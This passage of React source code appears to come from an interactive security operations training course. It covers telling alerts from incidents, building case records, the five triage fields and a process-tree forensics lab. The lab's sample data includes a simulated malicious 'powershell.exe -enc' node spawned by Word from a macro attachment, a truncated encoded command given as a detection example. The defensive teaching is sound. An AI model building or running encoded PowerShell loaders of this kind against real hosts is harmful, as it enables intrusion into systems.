                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                    className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span>Advance to Chapter 2.3: Understanding Incidents</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Chapter 2.3: Understanding Incidents */}
          {activeSubStep === 3 && (
            <Card className="shadow-xs border-border">
              <CardHeader className="pb-3 border-b bg-muted/20">
                <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                  <Flame className="w-4 h-4 text-rose-500" />
                  Chapter 2.3: Understanding Incidents (When Real Harm Requires Response)
                </CardTitle>
              </CardHeader>
              <CardContent className="p-5 sm:p-6 space-y-6">
                {/* Priya Quote */}
                <div className="p-4 rounded-xl border border-rose-200 bg-rose-50/40 text-xs space-y-2">
                  <div className="flex items-center gap-2 font-bold text-rose-900">
                    <span className="w-6 h-6 rounded-full bg-rose-600 text-white flex items-center justify-center text-[10px]">PS</span>
                    <span>Priya Sharma (Tier 2 Incident Responder): Formal Incident Declaration #INC-2026-0412</span>
                  </div>
                  <p className="text-rose-950 leading-relaxed italic">
                    &ldquo;Based on your initial L1 evidence extraction and my verification across the host, I am formally declaring this a <strong>Confirmed Incident</strong>. Threat is active, vector is confirmed, and containment response is authorized.&rdquo;
                  </p>
                </div>

                {/* Interactive Challenge: Alert or Incident? */}
                <div className="p-4 rounded-xl border bg-card space-y-3">
                  <div className="flex items-center justify-between">
                    <div>
                      <h4 className="text-xs font-bold text-foreground">Interactive Challenge: Predict Which Alerts Become Incidents</h4>
                      <p className="text-[11px] text-muted-foreground">Select Yes or No based on whether real harm or active threat requires response.</p>
                    </div>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => setU2IncidentPredictAnswers({})}
                      className="text-xs gap-1 h-7"
                    >
                      <RotateCcw className="w-3 h-3" />
                      Reset Challenge
                    </Button>
                  </div>

                  <div className="space-y-2.5 text-xs">
                    {[
                      { id: 1, text: 'Alert: Failed Logins x3 by kpatel. Investigation reveals: User forgot password and called Help Desk.', isIncident: false, reason: 'User error, benign; no security problem.' },
                      { id: 2, text: 'Alert: Encoded PowerShell at 22:45 PM on FIN-BOS-W4521. Investigation reveals: Stolen employee credentials used to reach C2.', isIncident: true, reason: 'Active unauthorized adversary execution requiring response.' },
                      { id: 3, text: 'Alert: USB Device plugged into FIN-NYC-W7821. Investigation reveals: Authorized IT technician replacing drivers per policy.', isIncident: false, reason: 'Authorized routine work; no threat present.' },
                      { id: 4, text: 'Alert: 48 Failed Logins from Romanian botnet to Domain Admin account.', isIncident: true, reason: 'Targeted adversary credential spray against root infrastructure.' },
                      { id: 5, text: 'Alert: Notepad opening system file. Investigation reveals: Sysadmin editing local host configuration file.', isIncident: false, reason: 'Standard administrative task.' },
                    ].map((item) => (
                      <div key={item.id} className="p-3 rounded-lg border bg-muted/20 flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                        <div className="space-y-0.5">
                          <p className="font-medium text-foreground">{item.text}</p>
                          {u2IncidentPredictAnswers[item.id] !== undefined && (
                            <p className="text-[11px] text-muted-foreground italic font-mono">{item.reason}</p>
                          )}
                        </div>
                        <div className="flex items-center gap-1.5 shrink-0">
                          <button
                            onClick={() => setU2IncidentPredictAnswers((prev) => ({ ...prev, [item.id]: true }))}
                            className={`px-3 py-1 rounded text-xs font-bold border transition-all ${
                              u2IncidentPredictAnswers[item.id] === true
                                ? item.isIncident
                                  ? 'bg-emerald-600 text-white border-emerald-600'
                                  : 'bg-rose-600 text-white border-rose-600'
                                : 'bg-card hover:bg-muted text-muted-foreground'
                            }`}
                          >
                            Yes (Incident)
                          </button>
                          <button
                            onClick={() => setU2IncidentPredictAnswers((prev) => ({ ...prev, [item.id]: false }))}
                            className={`px-3 py-1 rounded text-xs font-bold border transition-all ${
                              u2IncidentPredictAnswers[item.id] === false
                                ? !item.isIncident
                                  ? 'bg-emerald-600 text-white border-emerald-600'
                                  : 'bg-rose-600 text-white border-rose-600'
                                : 'bg-card hover:bg-muted text-muted-foreground'
                            }`}
                          >
                            No (Not Incident)
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-2">
                  {!isCh23Complete && !isChapterDone('unit-2', 3) && !freeNavigationEnabled ? (
                    <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5" />
                      Predict all 4 incident scenarios ({Object.keys(u2IncidentPredictAnswers).length}/4) to unlock Chapter 2.4
                    </span>
                  ) : <div />}
                  <Button
                    disabled={!isCh23Complete && !isChapterDone('unit-2', 3) && !freeNavigationEnabled}
                    onClick={() => {
                      markChapterDone('unit-2', 3);
                      setActiveSubStep(4);
                      onCompleteTopic('topic-2-2', 25);
                      onSelectTopic('topic-2-2');
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                    className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span>Advance to Chapter 2.4: Understanding Cases</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Chapter 2.4: Understanding Cases */}
          {activeSubStep === 4 && (
            <Card className="shadow-xs border-border">
              <CardHeader className="pb-3 border-b bg-muted/20">
                <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                  <FileText className="w-4 h-4 text-primary" />
                  Chapter 2.4: Understanding Cases (The Investigation Notebook)
                </CardTitle>
              </CardHeader>
              <CardContent className="p-5 sm:p-6 space-y-6">
                <div className="p-4 rounded-xl border bg-muted/20 space-y-2 text-xs">
                  <span className="font-bold text-foreground block font-mono">Case Record Notebook #SEC-2026-0412</span>
                  <p className="text-muted-foreground leading-relaxed">
                    &ldquo;A case is your written notebook. It connects all the people in the SOC: you write what you found, Priya reviews it to contain the host, Aditya uses it to hunt across 47 endpoints, and Elena reads it to brief executive leadership. Without the case notebook, everyone works blind.&rdquo;
                  </p>
                </div>

                {/* Interactive Challenge: Build a Case Record */}
                <div className="p-4 rounded-xl border bg-card space-y-3">
                  <div className="flex items-center justify-between">
                    <div>
                      <h4 className="text-xs font-bold text-foreground">Interactive Challenge: Order the 5 Pillars of a Case Record</h4>
                      <p className="text-[11px] text-muted-foreground">Click each section in the proper narrative sequence (Who -&gt; Evidence -&gt; Verdict -&gt; Events -&gt; Recommendations).</p>
                    </div>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => setU2CaseAssemblyOrder([])}
                      className="text-xs gap-1 h-7"
                    >
                      <RotateCcw className="w-3 h-3" />
                      Reset Order
                    </Button>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs">
                    {UNIT_2_CASE_RECORD_PARTS.map((part) => {
                      const isSelected = u2CaseAssemblyOrder.includes(part.id);
                      const orderNum = u2CaseAssemblyOrder.indexOf(part.id) + 1;
                      return (
                        <button
                          key={part.id}
                          disabled={isSelected}
                          onClick={() => setU2CaseAssemblyOrder((prev) => [...prev, part.id])}
                          className={`p-3 rounded-lg border text-left transition-all ${
                            isSelected
                              ? 'bg-primary/10 border-primary text-foreground font-semibold opacity-75'
                              : 'bg-card hover:bg-muted border-border text-muted-foreground'
                          }`}
                        >
                          <div className="flex items-center justify-between">
                            <span className="font-bold text-primary">{part.label}</span>
                            {isSelected && <Badge className="text-[10px] bg-primary text-primary-foreground">Step {orderNum}</Badge>}
                          </div>
                          <p className="text-[11px] mt-1 text-foreground/80">{part.content}</p>
                        </button>
                      );
                    })}
                  </div>

                  {u2CaseAssemblyOrder.length === 5 && (
                    <div className="p-3 rounded-lg bg-emerald-50 border border-emerald-300 text-emerald-950 text-xs flex items-center justify-between animate-fade-in">
                      <span>🎉 Perfect Case Structure! Who -&gt; What -&gt; Verdict -&gt; Sequence -&gt; Next Steps.</span>
                      <Badge className="bg-emerald-600 text-white">Audit Ready ✓</Badge>
                    </div>
                  )}
                </div>

                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-2">
                  {!isCh24Complete && !isChapterDone('unit-2', 4) && !freeNavigationEnabled ? (
                    <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5" />
                      Order all 5 sections of the case record ({u2CaseAssemblyOrder.length}/5) to unlock Chapter 2.5
                    </span>
                  ) : <div />}
                  <Button
                    disabled={!isCh24Complete && !isChapterDone('unit-2', 4) && !freeNavigationEnabled}
                    onClick={() => {
                      markChapterDone('unit-2', 4);
                      setActiveSubStep(5);
                      onCompleteTopic('topic-2-2', 25);
                      onSelectTopic('unit-2-assessment');
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                    className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span>Advance to Chapter 2.5: Knowledge Check</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Chapter 2.5: Knowledge Check */}
          {activeSubStep === 5 && (
            <Card className="shadow-sm border-primary/30">
              <CardHeader className="pb-3 border-b bg-primary/5">
                <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                  <Award className="w-4 h-4 text-primary" />
                  Chapter 2.5: Knowledge Check & Certification Assessment
                </CardTitle>
              </CardHeader>
              <CardContent className="p-5 sm:p-6 space-y-6">
                <div className="p-4 rounded-xl bg-slate-900 text-slate-100 border border-slate-800 space-y-2 text-xs">
                  <span className="text-sky-400 font-bold font-mono">SCENARIO: Alert SEC-2026-0521 (10:30 AM Shift Queue)</span>
                  <p className="text-slate-300">
                    Rule: Unusual Administrative Privilege Escalation | User: svc_app_update | Host: FIN-BOS-SERVER-DEPLOY-01 | Evidence: Process requested SYSTEM privilege. Investigation confirms approved daily routine deployment window; no anomalies.
                  </p>
                </div>

                <div className="space-y-4 text-xs">
                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 1: How does this activity map to Event, Alert, Case, and Incident?
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'opt-a', text: 'A) This is an active Incident requiring immediate network containment.' },
                        { id: 'opt-b', text: 'B) This was an Event cluster that created an Alert, which you investigated in a Case, but was NEVER declared an Incident because it was authorized.' },
                        { id: 'opt-c', text: 'C) Every alert is automatically an Incident regardless of authorization.' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU2KcQ1Answer(opt.id)}
                          className={`p-2.5 rounded-lg border text-left w-full transition-all ${
                            u2KcQ1Answer === opt.id
                              ? opt.id === 'opt-b'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
                                : 'bg-rose-50 border-rose-500 text-rose-950'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>

                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 2: What would you write in the Case notebook disposition?
                    </span>
                    <textarea
                      rows={3}
                      value={u2KcQ2Text}
                      onChange={(e) => setU2KcQ2Text(e.target.value)}
                      placeholder="Write your professional case note explaining why you are closing this alert..."
                      className="w-full p-2.5 text-xs rounded-lg border bg-background text-foreground font-mono focus:outline-hidden focus:ring-1 focus:ring-primary"
                    />
                    {u2KcQ2Text.length > 10 && (
                      <p className="text-[11px] text-emerald-600 font-sans">
                        ✓ Note captured! Good notes cite: scheduled window, authorized account, and absence of malicious indicators.
                      </p>
                    )}
                  </div>

                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 3: If this same activity occurred with ZERO change ticket and unknown source IP, what is your next action?
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'opt-close', text: 'A) Close it anyway because service accounts are normal.' },
                        { id: 'opt-l2', text: 'B) Escalate immediately to Priya (L2) as a confirmed unauthorized privilege escalation threat.' },
                        { id: 'opt-wait', text: 'C) Wait until tomorrow to see if anyone complains.' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU2KcQ3Answer(opt.id)}
                          className={`p-2.5 rounded-lg border text-left w-full transition-all ${
                            u2KcQ3Answer === opt.id
                              ? opt.id === 'opt-l2'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
                                : 'bg-rose-50 border-rose-500 text-rose-950'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>

                {(u2KcSubmitted || (mounted && (completedUnits.has('unit-2') || completedUnits.has('unit-2-assessment')))) ? (
                  <div className="p-4 rounded-xl border border-emerald-300 bg-emerald-50/70 text-emerald-950 flex flex-col sm:flex-row items-center justify-between gap-3 animate-fade-in" suppressHydrationWarning>
                    <div>
                      <span className="font-bold text-emerald-800 block">🎉 Unit 2 Certified! (+100 XP)</span>
                      <p className="text-xs text-emerald-700">You mastered Events, Alerts, Incidents, and Cases. Ready for Day 3 live queue triage!</p>
                    </div>
                    <Button
                      suppressHydrationWarning
                      onClick={() => onSelectTopic('topic-3-1')}
                      className="font-bold text-xs gap-1.5 bg-emerald-600 hover:bg-emerald-700 text-white shrink-0 cursor-pointer"
                    >
                      <span>Proceed to Unit 3: Alert Triage</span>
                      <ChevronRight className="w-4 h-4" />
                    </Button>
                  </div>
                ) : (
                  <div className="pt-2 flex flex-col sm:flex-row items-center justify-between gap-3">
                    <Button
                      variant="outline"
                      onClick={() => {
                        setU2KcQ1Answer('');
                        setU2KcQ2Text('');
                        setU2KcQ3Answer('');
                        setU2KcSubmitted(false);
                      }}
                      className="text-xs gap-1.5"
                    >
                      <RotateCcw className="w-3 h-3" />
                      Reset Knowledge Check
                    </Button>

                    <Button
                      disabled={!u2KcQ1Answer || !u2KcQ3Answer || u2KcQ2Text.trim().length < 5}
                      onClick={() => {
                        markChapterDone('unit-2', 5);
                        setU2KcSubmitted(true);
                        handleFinishAssessment('unit-2-assessment', 100);
                      }}
                      className="font-bold text-xs gap-2 bg-primary text-primary-foreground shadow-sm w-full sm:w-auto cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      <Award className="w-4 h-4" />
                      Submit & Certify Unit 2 (+100 XP)
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>
          )}
        </div>
      )}

      {/* ====================================================
          UNIT 3: ALERT TRIAGE & THE 5 FIELDS
         ==================================================== */}
      {unitId === 'unit-3' && (
        <div className="space-y-6">
          {/* Unit 3 Chapter Navigation Tabs */}
          <div className="rounded-2xl border bg-card shadow-sm overflow-hidden">
            <div className="p-2 sm:p-3 bg-card flex items-center justify-between gap-2 overflow-x-auto border-b">
              <div className="flex items-center gap-1 sm:gap-2">
                {[
                  { num: 1, label: 'Chapter 3.1: The 5 Critical Fields', topicId: 'topic-3-1' },
                  { num: 2, label: 'Chapter 3.2: Evidence Deep-Dive Lab', topicId: 'topic-3-2' },
                  { num: 3, label: 'Chapter 3.3: Shift Assessment', topicId: 'unit-3-assessment' },
                ].map((tab) => {
                  const isDone = isChapterDone('unit-3', tab.num) || (mounted && tab.num === 3 && (completedUnits.has('unit-3') || completedUnits.has('unit-3-assessment')));
                  const locked = isChapterLocked('unit-3', tab.num);
                  const isActive = activeSubStep === tab.num;
                  return (
                    <button
                      key={tab.num}
                      type="button"
                      suppressHydrationWarning
                      onClick={() => {
                        if (locked) {
                          showToast({
                            type: 'warning',
                            title: 'Chapter Locked 🔒',
                            description: `Complete Chapter 3.${tab.num - 1} first to unlock this chapter.`,
                          });
                          return;
                        }
                        setActiveSubStep(tab.num);
                        onSelectTopic(tab.topicId);
                        window.scrollTo({ top: 0, behavior: 'smooth' });
                      }}
                      className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all whitespace-nowrap flex items-center gap-1.5 ${
                        isActive
                          ? 'bg-primary text-primary-foreground shadow-xs font-bold'
                          : isDone
                          ? 'bg-emerald-50 text-emerald-800 hover:bg-emerald-100 border border-emerald-300 dark:bg-emerald-950/40 dark:text-emerald-300 dark:border-emerald-800'
                          : locked
                          ? 'opacity-60 cursor-not-allowed text-muted-foreground border border-border/60'
                          : 'hover:bg-muted text-muted-foreground border border-border/60'
                      }`}
                    >
                      {isDone ? (
                        <CheckCircle2 className="w-3 h-3 text-emerald-600 dark:text-emerald-400" />
                      ) : locked ? (
                        <Lock className="w-3 h-3 text-muted-foreground/60" />
                      ) : null}
                      <span>{tab.label}</span>
                    </button>
                  );
                })}
              </div>
              <div className="hidden md:flex items-center gap-2 shrink-0 text-xs text-muted-foreground font-mono">
                <span>Unit 3 — Chapter {activeSubStep} of 3</span>
              </div>
            </div>
          </div>

          {/* CHAPTER 3.1: THE 5 CRITICAL FIELDS */}
          {activeSubStep === 1 && (
            <Card className="shadow-xs border-border animate-fade-in">
              <CardHeader className="pb-3 border-b bg-muted/20 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div>
                  <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                    <Search className="w-4 h-4 text-primary" />
                    Chapter 3.1: Extracting the 5 Critical Fields Under 5 Minutes
                  </CardTitle>
                  <p className="text-xs text-muted-foreground mt-0.5">
                    Master the universal triage anchors: WHO, WHAT, WHERE, WHEN, and HOW MANY.
                  </p>
                </div>
                <div className="flex items-center gap-1.5">
                  {UNIT_3_TRIAGE_ALERTS.map((al, idx) => (
                    <button
                      key={al.id}
                      onClick={() => setU3ActiveTriageAlertIndex(idx)}
                      className={`px-2.5 py-1 rounded text-xs font-bold border transition-all ${
                        u3ActiveTriageAlertIndex === idx
                          ? 'bg-primary text-primary-foreground border-primary shadow-xs'
                          : 'bg-card hover:bg-muted border-border text-muted-foreground'
                      }`}
                    >
                      Alert {idx + 1}
                    </button>
                  ))}
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setU3RevealedFields({})}
                    className="text-xs gap-1 h-7 ml-2"
                  >
                    <RotateCcw className="w-3 h-3" />
                    Reset
                  </Button>
                </div>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                {/* Mentor Briefing Card */}
                <div className="p-4 rounded-xl border border-sky-200 bg-sky-50/50 dark:bg-sky-950/20 dark:border-sky-800 text-xs space-y-2">
                  <div className="flex items-center gap-2 font-bold text-sky-900 dark:text-sky-300">
                    <span className="w-6 h-6 rounded-full bg-sky-600 text-white flex items-center justify-center text-[10px]">RK</span>
                    <span>Rajesh Kumar (Senior L1 Mentor): &ldquo;The 5-Minute Emergency Room Rule&rdquo;</span>
                  </div>
                  <p className="text-sky-950 dark:text-sky-200 leading-relaxed">
                    &ldquo;Think of an emergency room nurse at a hospital. When 50 patients arrive, the nurse does not run a 4-hour MRI on everyone; they spend 60 seconds checking pulse, breathing, and symptoms to decide who needs the ICU and who can wait. In a SOC, you have 5 minutes per alert. You do not get lost in 10,000 log lines—you instantly extract the <strong>5 universal anchors</strong>: WHO, WHAT, WHERE, WHEN, and HOW MANY.&rdquo;
                  </p>
                </div>

                {/* Conceptual Framework: The 5 Anchors Explained with Beginner Analogies */}
                <div className="space-y-3">
                  <h4 className="text-xs font-bold text-foreground uppercase tracking-wider font-mono">
                    The 5 Universal Triage Anchors (Beginner Conceptual Guide)
                  </h4>
                  <div className="grid grid-cols-1 sm:grid-cols-5 gap-3 text-xs">
                    <div className="p-3.5 rounded-xl border bg-muted/20 space-y-1.5">
                      <div className="flex items-center gap-1.5 text-primary font-bold">
                        <Users className="w-3.5 h-3.5" />
                        <span>1. WHO</span>
                      </div>
                      <span className="text-[10px] font-mono text-muted-foreground block font-semibold">Analogy: The Security Badge</span>
                      <p className="text-[11px] text-foreground/80 leading-relaxed">
                        Who is the account? Is it an HR intern, a financial clerk, or a privileged IT Domain Administrator? A script run by IT is expected; run by an intern is suspicious.
                      </p>
                    </div>

                    <div className="p-3.5 rounded-xl border bg-muted/20 space-y-1.5">
                      <div className="flex items-center gap-1.5 text-primary font-bold">
                        <Laptop className="w-3.5 h-3.5" />
                        <span>2. WHAT</span>
                      </div>
                      <span className="text-[10px] font-mono text-muted-foreground block font-semibold">Analogy: The Tool & Room</span>
                      <p className="text-[11px] text-foreground/80 leading-relaxed">
                        What host and what process? Standard reception PC or production customer database? Is Word launching PowerShell or standard printer software?
                      </p>
                    </div>

                    <div className="p-3.5 rounded-xl border bg-muted/20 space-y-1.5">
                      <div className="flex items-center gap-1.5 text-primary font-bold">
                        <Network className="w-3.5 h-3.5" />
                        <span>3. WHERE</span>
                      </div>
                      <span className="text-[10px] font-mono text-muted-foreground block font-semibold">Analogy: The Crime Scene</span>
                      <p className="text-[11px] text-foreground/80 leading-relaxed">
                        Network boundary and direction. Is traffic staying inside the local Boston subnet (10.20.0.0/16) or attempting an outbound connection to an unknown IP?
                      </p>
                    </div>

                    <div className="p-3.5 rounded-xl border bg-muted/20 space-y-1.5">
                      <div className="flex items-center gap-1.5 text-primary font-bold">
                        <Clock className="w-3.5 h-3.5" />
                        <span>4. WHEN</span>
                      </div>
                      <span className="text-[10px] font-mono text-muted-foreground block font-semibold">Analogy: The Camera Clock</span>
                      <p className="text-[11px] text-foreground/80 leading-relaxed">
                        Timestamp and cadence. Did this happen at 2:00 PM on Tuesday during office hours, or 3:15 AM on Sunday when the employee was asleep in bed?
                      </p>
                    </div>

                    <div className="p-3.5 rounded-xl border bg-muted/20 space-y-1.5">
                      <div className="flex items-center gap-1.5 text-primary font-bold">
                        <Activity className="w-3.5 h-3.5" />
                        <span>5. HOW MANY</span>
                      </div>
                      <span className="text-[10px] font-mono text-muted-foreground block font-semibold">Analogy: The Knocks on Door</span>
                      <p className="text-[11px] text-foreground/80 leading-relaxed">
                        Frequency and volume. 1 failed password is a typo. 5,000 failed passwords in 60 seconds is an automated brute-force password attack.
                      </p>
                    </div>
                  </div>
                </div>

                {/* Interactive Triage Station */}
                {(() => {
                  const alertItem = UNIT_3_TRIAGE_ALERTS[u3ActiveTriageAlertIndex];
                  return (
                    <div className="space-y-4 pt-2 border-t">
                      {/* Alert Raw Telemetry Header */}
                      <div className="p-4 rounded-xl bg-slate-950 text-slate-100 border border-slate-800 space-y-3 font-mono text-xs">
                        <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                          <span className="text-amber-400 font-bold">{alertItem.alertId}: {alertItem.ruleName}</span>
                          <Badge className="bg-rose-500/20 text-rose-300 border-rose-500/30 text-[10px]">{alertItem.severity}</Badge>
                        </div>
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-[11px] text-slate-300">
                          {Object.entries(alertItem.rawJson).map(([k, v]) => (
                            <div key={k} className="p-2 rounded bg-slate-900 border border-slate-800">
                              <span className="text-slate-500 uppercase">{k}:</span> <span className="text-sky-300">{v}</span>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* 5 Field Extraction Grid */}
                      <div className="space-y-2.5">
                        <span className="text-xs font-bold text-foreground uppercase tracking-wider font-mono">
                          Click Each Anchor Below to Extract Findings from Telemetry:
                        </span>
                        <div className="grid grid-cols-1 sm:grid-cols-5 gap-2.5 text-xs">
                          {[
                            { key: 'who', label: '1. WHO', value: alertItem.fields.who, desc: 'Identity / Account' },
                            { key: 'what', label: '2. WHAT', value: alertItem.fields.what, desc: 'Host & Process' },
                            { key: 'where', label: '3. WHERE', value: alertItem.fields.where, desc: 'Network / Location' },
                            { key: 'when', label: '4. WHEN', value: alertItem.fields.when, desc: 'Timestamp / Schedule' },
                            { key: 'howMany', label: '5. HOW MANY', value: alertItem.fields.howMany, desc: 'Volume / Occurrences' },
                          ].map((field) => {
                            const isRevealed = u3RevealedFields[`${alertItem.id}-${field.key}`];
                            return (
                              <button
                                key={field.key}
                                onClick={() => setU3RevealedFields((prev) => ({ ...prev, [`${alertItem.id}-${field.key}`]: true }))}
                                className={`p-3 rounded-xl border text-left transition-all space-y-1 ${
                                  isRevealed
                                    ? 'bg-primary/10 border-primary text-foreground'
                                    : 'bg-muted/40 hover:bg-muted border-dashed border-border text-muted-foreground'
                                }`}
                              >
                                <div className="flex items-center justify-between">
                                  <span className="font-bold text-primary">{field.label}</span>
                                  <Eye className="w-3 h-3 text-muted-foreground" />
                                </div>
                                <span className="text-[10px] block opacity-75">{field.desc}</span>
                                {isRevealed ? (
                                  <p className="font-medium text-[11px] text-foreground pt-1 border-t border-primary/20 animate-fade-in">{field.value}</p>
                                ) : (
                                  <p className="text-[10px] text-primary underline pt-1">Click to Extract</p>
                                )}
                              </button>
                            );
                          })}
                        </div>
                      </div>

                      {/* Story Synthesis */}
                      <div className="p-4 rounded-xl border bg-muted/20 text-xs space-y-1">
                        <span className="font-bold text-foreground font-mono">The Synthesized Alert Narrative:</span>
                        <p className="text-muted-foreground leading-relaxed italic">{alertItem.storySummary}</p>
                        <p className="text-[11px] text-primary font-mono pt-1">Triage Priority: {alertItem.priorityRank} — {alertItem.reasoning}</p>
                      </div>

                      {/* Advance Bar */}
                      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-3 border-t">
                        {!isU3Ch1Complete && !isChapterDone('unit-3', 1) && !freeNavigationEnabled ? (
                          <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                            <Lock className="w-3.5 h-3.5" />
                            Extract at least 3 fields above ({Object.keys(u3RevealedFields).length}/3) to unlock Chapter 3.2
                          </span>
                        ) : <div />}
                        <Button
                          disabled={!isU3Ch1Complete && !isChapterDone('unit-3', 1) && !freeNavigationEnabled}
                          onClick={() => {
                            markChapterDone('unit-3', 1);
                            setActiveSubStep(2);
                            onCompleteTopic('topic-3-1', 35);
                            onSelectTopic('topic-3-2');
                            window.scrollTo({ top: 0, behavior: 'smooth' });
                          }}
                          className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          <span>Advance to Chapter 3.2: Evidence Deep-Dive Lab</span>
                          <ChevronRight className="w-4 h-4" />
                        </Button>
                      </div>
                    </div>
                  );
                })()}
              </CardContent>
            </Card>
          )}

          {/* CHAPTER 3.2: EVIDENCE DEEP-DIVE LAB */}
          {activeSubStep === 2 && (
            <Card className="shadow-xs border-border animate-fade-in">
              <CardHeader className="pb-3 border-b bg-muted/20">
                <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-primary" />
                  Chapter 3.2: Evidence Deep-Dive Lab (Process Trees, Decoders &amp; Threat Intel)
                </CardTitle>
                <p className="text-xs text-muted-foreground mt-0.5">
                  Hands-on forensic tools: Inspect parent-child process relationships, decode Base64 obfuscation, and verify file hashes.
                </p>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                {/* Interactive SOC Dashboard Lab Launcher */}
                <CourseLabLauncher
                  labId="lab-01"
                  onLabCompleted={() => {
                    markChapterDone('unit-3', 2);
                    onCompleteTopic('topic-3-2', 50);
                  }}
                />

                {/* Forensic Concept Cards */}
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
                  <div className="p-4 rounded-xl border bg-muted/20 space-y-1">
                    <span className="font-bold text-foreground flex items-center gap-1.5">
                      <Workflow className="w-3.5 h-3.5 text-primary" />
                      Parent-Child Process Trees
                    </span>
                    <p className="text-muted-foreground leading-relaxed text-[11px]">
                      An OS behaves like a genealogy tree. Every process has a Parent PID (PPID). Normal: `explorer.exe` spawns `WINWORD.EXE`. Abnormal: `WINWORD.EXE` spawns `powershell.exe`. A word processor has zero legitimate reason to execute a shell.
                    </p>
                  </div>

                  <div className="p-4 rounded-xl border bg-muted/20 space-y-1">
                    <span className="font-bold text-foreground flex items-center gap-1.5">
                      <Terminal className="w-3.5 h-3.5 text-primary" />
                      Base64 Command Obfuscation
                    </span>
                    <p className="text-muted-foreground leading-relaxed text-[11px]">
                      Attackers use `-enc` (EncodedCommand) in PowerShell to hide malicious web downloads from basic antivirus string scanners. L1 analysts must decode the ASCII payload immediately.
                    </p>
                  </div>

                  <div className="p-4 rounded-xl border bg-muted/20 space-y-1">
                    <span className="font-bold text-foreground flex items-center gap-1.5">
                      <Shield className="w-3.5 h-3.5 text-primary" />
                      SHA-256 Threat Intelligence
                    </span>
                    <p className="text-muted-foreground leading-relaxed text-[11px]">
                      Attackers change filenames from `trojan.exe` to `invoice.pdf`, but the cryptographic hash (SHA-256) remains unchanged. Querying threat intelligence reveals global adversary reputation.
                    </p>
                  </div>
                </div>

                {/* Lab 1: Interactive Process Tree Explorer */}
                <div className="p-4 rounded-xl border bg-card space-y-3">
                  <div className="flex items-center justify-between">
                    <div>
                      <h4 className="text-xs font-bold text-foreground">Lab 1: EDR Process Tree Inspector (Host: FIN-BOS-MCHEN-047)</h4>
                      <p className="text-[11px] text-muted-foreground">Click each process node to inspect PID, parent, and anomaly rating.</p>
                    </div>
                    {u3SelectedProcessNode && <Badge className="text-[10px] bg-primary text-primary-foreground">Node Inspected ✓</Badge>}
                  </div>

                  <div className="space-y-2 text-xs font-mono">
                    {[
                      { id: 'proc-1', name: 'explorer.exe', pid: '2840', ppid: '840', user: 'FINCORP\\mchen', isMalicious: false, note: 'Normal Windows user desktop shell' },
                      { id: 'proc-2', name: 'WINWORD.EXE', pid: '4812', ppid: '2840', user: 'FINCORP\\mchen', isMalicious: false, note: 'User opened email attachment Q4_Invoice.docm' },
                      { id: 'proc-3', name: 'powershell.exe -enc SW52...', pid: '9024', ppid: '4812', user: 'FINCORP\\mchen', isMalicious: true, note: '🚨 HIGH ANOMALY: Word spawned PowerShell shell!' },
